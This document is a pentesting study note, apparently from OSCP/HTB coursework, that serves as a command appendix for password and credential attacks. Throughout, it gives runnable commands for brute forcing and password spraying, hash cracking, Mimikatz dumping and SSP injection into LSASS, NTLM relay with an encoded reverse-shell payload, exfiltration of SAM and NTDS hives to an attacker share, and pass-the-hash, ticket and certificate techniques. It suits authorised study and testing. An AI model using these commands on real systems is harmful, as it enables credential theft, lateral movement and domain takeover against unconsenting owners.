# Password Attacks — Command Appendix

Part of [[COMMAND APPENDIX]]. Syntax-first reference for credential-related tools: Hydra, Hashcat, JtR, Mimikatz, Responder, ntlmrelayx, impacket PtH tools. Full context and explanations live in [[Password Attacks]].

---

## Hydra

```bash
# SSH dictionary attack, non-standard port
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target>

# RDP password spray (one password, many usernames -- stays under lockout threshold)
hydra -L users.txt -p "<password>" rdp://<target>

# HTTP POST form attack (get field names + failure string from Burp first)
# Three colon-separated fields: path : POST body with ^PASS^ : failure indicator
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> \
  http-post-form "/<path>:<fieldname>=^PASS^:<failure-string>"

# HTTP basic auth (WWW-Authenticate: Basic -- fastest Hydra target, no redirect)
hydra -l <user> -P /usr/share/wordlists/rockyou.txt http-get://<target>/

# RDP limits to 4 parallel tasks (-t 4); SSH defaults to 16

# SMTP brute force — use full email-format username when server requires it
hydra -l user@domain.htb -P /usr/share/wordlists/rockyou.txt smtp://TARGET -f

# POP3 brute force
hydra -l username -P /usr/share/wordlists/rockyou.txt pop3://TARGET

# FTP with thread throttle (-t 1) for servers that 550-error under load
hydra -l username -P /usr/share/wordlists/rockyou.txt ftp://TARGET -u -t 1
```

Key flags:

| Flag | Meaning |
|---|---|
| `-l <name>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-s <port>` | Non-standard port |
| `-t <n>` | Parallel tasks |
| `-I` | Skip restore file (force restart) |

🔁 [[Password Attacks#16.1.1. SSH|16.1.1 SSH]], [[Password Attacks#16.1.2. RDP|16.1.2 RDP]], [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3 HTTP POST form]]

---

## Hashcat

```bash
# Benchmark your hardware (reference for cracking time estimates)
hashcat -b

# Crack an MD5 hash with rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# Crack an NTLM hash (mode 1000, no salt, very fast)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule --force

# Crack a Net-NTLMv2 hash (mode 5600, must include the full hash line)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

# Crack a KeePass database hash (mode 13400)
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Crack an SSH private key passphrase (mode 22921 -- only if AES-256-CBC; use JtR for AES-256-CTR)
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force

# Rule-based mutation (append character, capitalise, etc.)
hashcat -m 0 hash.txt wordlist.txt -r demo.rule --force

# Debug: preview mutations without cracking (stdout mode)
hashcat -r demo.rule --stdout wordlist.txt

# Pre-built rule files
ls /usr/share/hashcat/rules/
# best66.rule, rockyou-30000.rule, dive.rule, d3ad0ne.rule

# Mask attack (-a 3): structured brute force with character class tokens per position
# ?u=uppercase ?l=lowercase ?d=digit ?s=special char ?a=all printable
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'

# Generate mutated wordlist to file (no cracking -- preview what --stdout produces)
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Crack Password Safe v3 master password
hashcat -m 5200 vault.psafe3 /usr/share/wordlists/rockyou.txt

# Find hashcat mode number for any format
hashcat --example-hashes | grep -i "bitlocker" -A 5

# Show previously cracked hashes from potfile (no re-run needed)
hashcat -m 1000 hash.txt --show
```

Hash modes quick reference:

| Mode | Algorithm | Notes |
|---|---|---|
| 0 | MD5 | General web hashes |
| 100 | SHA-1 | 40 hex chars |
| 1000 | NTLM | SAM dump, no salt |
| 3200 | bcrypt | Very slow (~1000x slower than NTLM) |
| 5200 | Password Safe v3 | psafe3 files |
| 5600 | Net-NTLMv2 | Responder/xp_dirtree capture, full challenge-response string |
| 7300 | IPMI2 RAKP HMAC-SHA1 | ipmi_dumphashes MSF output |
| 13400 | KeePass | keepass2john output |
| 22100 | BitLocker AES-CBC 128/256 | bitlocker2john $0 hash |
| 22921 | RSA/DSA/EC key (AES-256-CBC) | ssh2john output, not all cipher modes |

🔁 [[Password Attacks#16.2.2. Mutating Wordlists|16.2.2 Mutating Wordlists]], [[Password Attacks#16.3.1. Cracking NTLM|16.3.1 NTLM]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 Net-NTLMv2]]

---

## John the Ripper (JtR)

```bash
# Extract hash from a KeePass .kdbx file
keepass2john database.kdbx > keepass.hash

# Extract hash from an SSH private key
ssh2john id_rsa > ssh.hash

# Crack with a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Crack with a wordlist + custom JtR rules (added to john.conf)
john --wordlist=passwords.txt --rules=sshRules hash.txt

# Show cracked passwords
john --show hash.txt

# Single-crack mode: mangle username/GECOS field — run this FIRST before wordlist
john --single combined.txt

# Specify hash format explicitly when auto-detect fails
john --format=ripemd-128 --wordlist=rockyou.txt hash.txt

# Combine /etc/passwd + /etc/shadow so single-crack has username context
unshadow /etc/passwd /etc/shadow > combined.txt

# Extract hash from password-protected Office document (.xlsx, .docx, .pptx)
office2john Confidential.xlsx > hash.txt && john --wordlist=rockyou.txt hash.txt

# Extract hash from BitLocker-encrypted VHD (isolate user-password hash, not recovery hash)
bitlocker2john -i Private.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
john --wordlist=rockyou.txt backup.hash
```

JtR vs Hashcat: use JtR for SSH keys using AES-256-CTR cipher mode (Hashcat mode 22921 only supports AES-256-CBC). `ssh2john` output starting with `$sshng$6$` = SHA-512 key derivation, AES-256-CTR -- use JtR.

🔁 [[Password Attacks#16.2.4. Password Manager|16.2.4 KeePass]], [[Password Attacks#16.2.5. SSH Private Key Passphrase|16.2.5 SSH key]]

---

## Mimikatz

```
# Standard privilege chain (run in this order every time)
privilege::debug          # Enables SeDebugPrivilege -- required before any sensitive operation
token::elevate            # Impersonates SYSTEM token (needed for lsadump::sam)
lsadump::sam              # Dumps all local NTLM hashes from SAM database

# Dump cached domain credentials from LSASS memory
sekurlsa::logonpasswords  # Shows plaintext (if wdigest enabled) or encrypted blobs (Credential Guard)

# Credential Guard bypass: inject malicious SSP into LSASS
misc::memssp              # Hook SSPI layer; credentials captured to C:\Windows\System32\mimilsa.log

# Read the SSP log
# (exit Mimikatz first -- "type" is a shell command, not a Mimikatz command)
type C:\Windows\System32\mimilsa.log
```

> On Windows Server 2022: `lsadump::sam` fails even with a SYSTEM impersonation token because Windows checks the PRIMARY process token, not the thread token. Fix: run Mimikatz via `schtasks /ru <adminuser> /rp <password>` so the admin's token IS the primary token. See [[Password Attacks#16.3.2. Passing NTLM|16.3.2 lab section]] for the full schtask command.

🔁 [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]], [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]

---

## Responder (Net-NTLMv2 capture)

```bash
# Start Responder on VPN interface (requires sudo for raw socket)
sudo responder -I tun0

# From a foothold on the victim: force an outbound SMB auth to Kali
dir \\<kali-ip>\test    # "Access is denied" is expected -- hash is still captured

# Captured hash format:
# <user>::<domain>:<challenge>:<response>:<blob>
# Save the full line to a file, then crack with hashcat -m 5600
```

🔁 [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]

---

## impacket-ntlmrelayx (NTLM relay)

```bash
# Relay intercepted SMB auth to a second target and execute a command
impacket-ntlmrelayx --no-http-server -smb2support \
  -t <relay-target-ip> \
  -c "powershell -enc <UTF-16LE-base64-payload>"

# Generate UTF-16LE base64 for PowerShell -enc (can't use pwsh on Linux for nested quotes)
python3 -c "
import base64
cmd = '<reverse-shell-oneliner>'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
"

# nc listener to catch the relay-delivered shell
nc -nvlp 8080
```

Constraint: the relayed user must have local admin on the relay target. The relay target cannot be the same machine the auth came from.

🔁 [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4]]

---

## Pass-the-Hash (impacket + smbclient)

```bash
# Get an interactive SYSTEM shell via PtH (psexec always gives SYSTEM)
impacket-psexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>

# Get a shell as the authenticated user (wmiexec -- no file drop to disk)
impacket-wmiexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>

# Access an SMB share without a plaintext password
smbclient \\\\<target>\\<share> -U Administrator --pw-nt-hash <NThash>
```

The LM hash portion is always 32 zeros on modern Windows (LM disabled since Vista/2008). Format: `LMhash:NThash`.

🔁 [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]

---

## BitLocker VHD — Crack and Mount

```bash
# 1. Set up loop device from the VHD file
sudo losetup -f -P Private.vhd     # -f = next free loop, -P = create partition devices
losetup --all                        # find loop device name (e.g. /dev/loop0)

# 2. Decrypt with dislocker (password immediately after -u, no space)
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo dislocker /dev/loop0p1 -uCRACKEDPASSWORD -- /media/bitlocker

# 3. Mount the decrypted image
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

🔁 [[Password Attacks (HTB Supplementary)#PA.4. BitLocker VHD: Full Crack + Mount Chain|PA.4]]

---

## SAM Offline Dump

```bash
# On target (Windows, as Administrator)
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# On Kali — receive via SMB share
sudo impacket-smbserver -smb2support CompData /home/kali/loot

# On target — move to Kali share
move C:\sam.save \\KALI_IP\CompData
move C:\system.save \\KALI_IP\CompData
move C:\security.save \\KALI_IP\CompData

# On Kali — dump offline
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
# Note: _SC_ prefix entries in LSA secrets output are plaintext service account credentials

# Extract NT hashes only for cracking
cut -d ':' -f 4 samhashes.txt > nthashes.txt
```

🔁 [[Password Attacks (HTB Supplementary)#PA.7. SAM Offline Dump|PA.7]]

---

## LSASS Offline Dump (pypykatz)

```bash
# On target: Task Manager → Details → lsass.exe → right-click → Create dump file
# Move dump to Kali via smbserver (same method as SAM above)

# Parse the dump on Kali
pypykatz lsa minidump lsass.DMP
# Output per session: NTLM hash, SHA1 hash — take NT hash for cracking or PtH
```

🔁 [[Password Attacks (HTB Supplementary)#PA.8. LSASS Dump via Task Manager + pypykatz|PA.8]]

---

## NetExec Remote Credential Dumping

```bash
# Dump LSA secrets (includes plaintext service account creds, _SC_ keys)
netexec smb TARGET --local-auth -u admin -p 'Password' --lsa

# Dump all domain hashes from DC (requires Domain Admin)
nxc smb DC_IP -u admin -p 'Password' --ntds

# Dump one user's hash from NTDS
nxc smb DC_IP -u admin -H NT_HASH --ntds --user Administrator

# Dump local SAM
nxc smb TARGET --local-auth -u admin -p 'Password' --sam
```

🔁 [[Password Attacks (HTB Supplementary)#PA.9. Remote Credential Dumping via NetExec|PA.9]]

---

## Windows Credential Manager

```cmd
# Enumerate stored credentials
cmdkey /list

# Spawn process using stored credential (no password prompt)
runas /savecred /user:DOMAIN\user cmd

# Dump all software-stored passwords (browsers, WinSCP, Filezilla, Outlook...)
lazagne.exe all
```

🔁 [[Password Attacks (HTB Supplementary)#PA.10. Windows Credential Manager|PA.10]]

---

## Credential Hunting — Windows Files

```cmd
# Recursive search all common config/script files for a keyword (case-insensitive)
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Check unattended install file (often has admin password in plaintext)
type C:\Windows\Panther\unattend.xml
type C:\inetpub\wwwroot\web.config
```

```powershell
# PowerShell recursive content search across UNC share
Get-ChildItem -Recurse -Include *.* \\SERVER\Share | Select-String -Pattern "DOMAIN\\"
```

🔁 [[Password Attacks (HTB Supplementary)#PA.11. Credential Hunting in Windows Files|PA.11]]

---

## NTDS via Volume Shadow Copy

```powershell
# Create shadow copy of C:
vssadmin CREATE SHADOW /For=C:
# Note the shadow path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Copy locked NTDS.dit from shadow volume
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .\NTDS.dit
cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
```

```bash
# Dump all domain hashes offline (Kali)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

🔁 [[Password Attacks (HTB Supplementary)#PA.12. NTDS.dit via VSS|PA.12]]

---

## Username Generation (username-anarchy)

```bash
git clone https://github.com/urbanadventurer/username-anarchy && cd username-anarchy
./username-anarchy FirstName LastName > usernames.txt
# Generates: jsmith, j.smith, smithj, john.smith, johnsmith, etc.
```

🔁 [[Password Attacks (HTB Supplementary)#PA.13. Username Generation|PA.13]]

---

## kerbrute

```bash
# Enumerate valid AD usernames via Kerberos (no auth events for invalid users)
./kerbrute userenum -d domain.local --dc DC_IP usernames.txt

# Brute-force a single user's password (low noise vs LDAP)
./kerbrute bruteuser -d domain.local --dc DC_IP /usr/share/wordlists/fasttrack.txt username

# Get domain name from SMB banner first
netexec smb DC_IP   # → (domain:ILF.local)
```

🔁 [[Password Attacks (HTB Supplementary)#PA.14. kerbrute|PA.14]]

---

## Pass-the-Hash — Extended

```bash
# PtH via RDP (requires DisableRestrictedAdmin = 0 on target first)
nxc smb TARGET -u Administrator -d . -H NT_HASH \
  -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
xfreerdp /v:TARGET /u:Administrator /pth:NT_HASH

# PtH remote command execution via nxc
nxc smb TARGET -u Administrator -d . -H NT_HASH -x 'whoami'
```

```
# Mimikatz: spawn a new process running as a different user's hash
mimikatz # sekurlsa::pth /user:USERNAME /rc4:NT_HASH /domain:DOMAIN /run:cmd.exe
# A new cmd.exe opens in the target user's security context
```

```powershell
# Invoke-TheHash: PtH lateral movement via WMI (from a pivot host)
Import-Module C:\tools\Invoke-TheHash\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain domain.local -Username username \
  -Hash NT_HASH -Command "powershell -e BASE64_SHELL"
```

🔁 [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash — Deep Dive|PA.18]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]

---

## Pass-the-Ticket — Windows

```
# Export all Kerberos tickets to .kirbi files (Group 2 = TGT, Group 0/1 = TGS)
mimikatz # sekurlsa::tickets /export

# Load a ticket into the current session
mimikatz # kerberos::ptt "C:\path\[0;461ec]-2-0-40e10000-john@krbtgt-DOMAIN.kirbi"

# Verify ticket is loaded
klist
```

```powershell
# After PtT, access resources or PSRemote as the ticketed user
dir \\DC01\share
Enter-PSSession -ComputerName DC01
```

🔁 [[Password Attacks (HTB Supplementary)#PA.19. Pass the Ticket (PtT) from Windows|PA.19]]

---

## Pass-the-Ticket — Linux

```bash
# Find ccache files (Kerberos tickets in /tmp)
ls -la /tmp/ | grep krb5

# Steal a ticket and set it as active
cp /tmp/krb5cc_647401106_XXXXX /root/
export KRB5CCNAME=/root/krb5cc_647401106_XXXXX
klist    # verify

# Use ticket for SMB access (no password)
smbclient //dc01/share -k -c 'get flag.txt' -no-pass

# Extract hashes from a keytab file
python3 /opt/keytabextract.py /path/file.keytab

# Kinit with machine account keytab
kinit 'MACHINE$@DOMAIN' -k -t /etc/krb5.keytab

# Find keytab files
find / -name *keytab* -ls 2>/dev/null
```

🔁 [[Password Attacks (HTB Supplementary)#PA.20. Pass the Ticket (PtT) from Linux|PA.20]]

---

## Pass-the-Certificate (PtC / Shadow Credentials)

```bash
# Add shadow credential to target AD account (requires write access to account object)
python3 pywhisker.py --dc-ip DC_IP -d DOMAIN -u attacker -p 'pass' \
  --target targetuser --action add
# → saves cert.pfx + prints pfx-pass

# Request TGT using the certificate (PKINIT)
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'PFX_PASS' \
  -dc-ip DC_IP DOMAIN/targetuser /tmp/user.ccache
# If "Error detecting libcrypto version": pip3 install -I git+https://github.com/wbond/oscrypto.git

export KRB5CCNAME=/tmp/user.ccache

# Authenticate with the TGT (no password or hash needed)
evil-winrm -i dc01.domain.local -r domain.local
```

🔁 [[Password Attacks (HTB Supplementary)#PA.21. Pass the Certificate (PtC) / Shadow Credentials|PA.21]]

---

#### Tags: #CommandAppendix #PasswordAttacks #Hydra #Hashcat #JohnTheRipper #Mimikatz #Responder #ntlmrelayx #PassTheHash #impacket #NetNTLMv2 #NTLM #CredentialGuard #kerbrute #PtT #PtC #PassTheTicket #PassTheCertificate #pypykatz #LaZagne #NTDS #VSS #BitLocker #usernameAnarchy #SAMDump #Kerberos #pywhisker #PKINITtools
